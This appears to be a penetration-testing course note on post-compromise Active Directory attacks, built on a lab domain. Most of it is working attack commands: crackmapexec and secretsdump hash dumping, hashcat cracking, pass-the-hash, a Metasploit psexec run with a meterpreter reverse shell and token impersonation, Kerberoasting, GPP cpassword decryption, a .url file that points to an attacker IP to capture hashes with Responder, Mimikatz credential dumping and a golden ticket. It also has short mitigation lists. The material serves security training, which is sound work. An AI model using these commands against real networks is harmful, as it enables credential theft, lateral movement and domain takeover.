# Post Compromise Attacks

## Pass the Password Attacks

#### crackmapexec

```bash
kali@kali:~/ctf/tcm/peh$ crackmapexec smb 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
# Dump the SAM hashes
--sam
# Dump the LSA secrets
--lsa
# Dump the NTDS.dit
--ntds
```

#### psexec

```bash
kali@kali:~/ctf/tcm/peh$ /usr/share/doc/python3-impacket/examples/psexec.py marvel/fcastle:Password1@192.168.57.142
```

## Dumping Hashes with secretsdump.py

#### secretsdump

```bash
kali@kali:~/ctf/tcm/peh$ /usr/share/doc/python3-impacket/examples/secretsdump.py marvel/fcastle:Password1@192.168.57.141
```

## Cracking NTLM Hashes with Hashcat

#### hashcat

```bash
kali@kali:~/ctf/tcm/peh$ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt 
```

## Pass the Hash Attacks

#### crackmapexec

```bash
kali@kali:~/ctf/tcm/peh$ crackmapexec smb 192.168.57.0/24 -u "Frank Castle" -H <HASH> --local-auth
```

## Pass Attack Mitigations

Hard to completely prevent, but we can make it more difficult on an attacker:

* Limit account re-use
  * Avoid re-using local admin password
  * Disable Guest and Administrator accounts
  * Limit who is a local administrator (least privilege)
* Utilize strong passwords
  * The longer the better
  * Avoid using common words
  * Long sentences
* Privilege Access Management (PAM)
  * Check out/in sensitive accounts when needed
  * Automatically rotate passwords on check out and check in
  * Limits pass attacks as hash/password is strong and constantly rotated

## Token Impersonation

### Overview

#### What are tokens?

* Temporary keys that allow you to access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.

#### Two Types

* Delegate - Created for logging into a machine or using Remote Desktop
* Impersonate - "non-interactive" such as attach a network drive or a domain logon script

### Token Impersonation with Incognito

#### Metasploit

```bash
msfconsole
use exploit/windows/smb/psexec
# Set RHOSTS, SMBDomain, SMBPass, and SMBUser; 
# set target 2; set payload windows/x64/meterpreter/reverse_tcp; set LHOST
run
# hashdump
# getuid
# sysinfo
load incognito
help
list_tokens -u
impersonate_token marvel\\administrator
shell
whoami
```

### Mitigation

#### Strategies

* Limit user/group token creation permissions
* Account tiering
* Local admin restriction

## Kerberoasting

### Overview

[https://medium.com/@Shorty420/kerberoasting-9108477279cc](https://medium.com/@Shorty420/kerberoasting-9108477279cc)

#### Steps

1. Get SPNs, Dump Hash
   1. `python GetUserSPNs.py <DOMAIN/username:password> dc-ip <ip of DC> -request`
2. Crack that hash
   1. `hashcat -m 13100 kerberoast.txt rockyou.txt`

### Example

#### GetUserSPNs

```bash
GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request
```

Copy the hash from the output and paste it into a text file.

#### hashcat

```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

### Mitigation

#### Strategies

* Strong Passwords
* Least privileges

## GPP / cPassword Attacks

### GPP / cPassword Attacks Overview

Group Policy Preferences (GPP) AKA MS14-025

* Group Policy Preferences allowed admins to created policies using embedded credentials
* These credentials were encrypted and placed in a "cPassword"
* The key was accidentally released
* Patched in MS14-025, but doesn't prevent previous uses

Can check using `smb_enum_gpp` Metasploit module

#### Resource

[https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/](https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)

### Abusing GPP

Example using Active on HackTheBox.

#### Part 1

1. Downloaded files from SMB
2. Found Groups.xml with `name-active.htb\SVC_TGS` and the `cpassword="<hash>"`
3. Execute `gpp-decrypt` \<hash>

#### Part 2

1. &#x20;Tried `psexec.py active.htb/svc_tgs:<password>@<IP>` but failed...
2. Then `GetUserSPNs.py active.htb/svc_tgs:<password> -dc-ip <IP> -request`
   1. Returns a service ticket which we can copy and crack
      1. hashcat -m 13100 hashes.txt rockyou.txt -O
3. Finally psexec.py active.htb/Administrator:\<password>@\<IP>

## URL File Attacks

Requires compromised user account of an open file share.

Create a file:

```
[InternetShortcut] 
URL=blah 
WorkingDirectory=blah 
IconFile=\<ATACKER IP>%USERNAME%.icon 
IconIndex=1Mimikatz
```

Save file at "@test.url". Needs '@' and '.url' which will ensure it ends up at the top of the folder.

Then place it on a file share.

Then run Responder: `responder -I eth0 -v`

Now when a user navigates to the file share, responder will capture hashes.

#### Resources

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share)

## Mimikatz

### Overview

#### What is Mimikatz?

* Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
* Dumps credentials stored in memory
* Just a few attacks: Credential dumping, Pass-the-hash, Over-pass-the-hash, Pass-the-ticket, Golden Ticket, Silver Ticket

### Credential Dumping

Assuming we have already compromised the Domain Controller

```powershell
mimikatz
privilege::debug
sekurlsa::logonpasswords  # Check for logon users passwords in memory
lsadump::sam  # Try to dump the SAM
lsadump::lsa /patch  # Try to dump the LSA
```

## Golden Ticket Attacks

```powershell
mimikatz
privilege::debug
lsadump::lsa /inject /name:krbtgt
# Copy the SID of the domain ex: S-1-5-21-xxxx-xxxx-xxxx
# Copy the NTLM Hash of the kerberos TGT account
kerberos::golden /User:Administrator /domain:marvel.local /sid:<SID> /krbtgt:<NTLM Hash> /id:500 /ptt
# Look for "Golden ticket for ... successfully submitted for current session
misc::cmd  # Start a command prompt utilizing session using golden ticket we created
dir \\THEPUNISHER\c$  # We have access to this machine
# And then can try psexec.exe \\THEPUNISHER cmd.exe
```

## Additional Resources

Active Directory Security Blog: [https://adsecurity.org/](https://adsecurity.org/)

Harmj0y Blog: [http://blog.harmj0y.net/](http://blog.harmj0y.net/)

Pentester Academy Active Directory: [https://www.pentesteracademy.com/activedirectorylab](https://www.pentesteracademy.com/activedirectorylab)

Pentester Academy Red Team Labs: [https://www.pentesteracademy.com/redteamlab](https://www.pentesteracademy.com/redteamlab)

eLS PTX: [https://elearnsecurity.com/product/ecptx-certification/](https://elearnsecurity.com/product/ecptx-certification/)
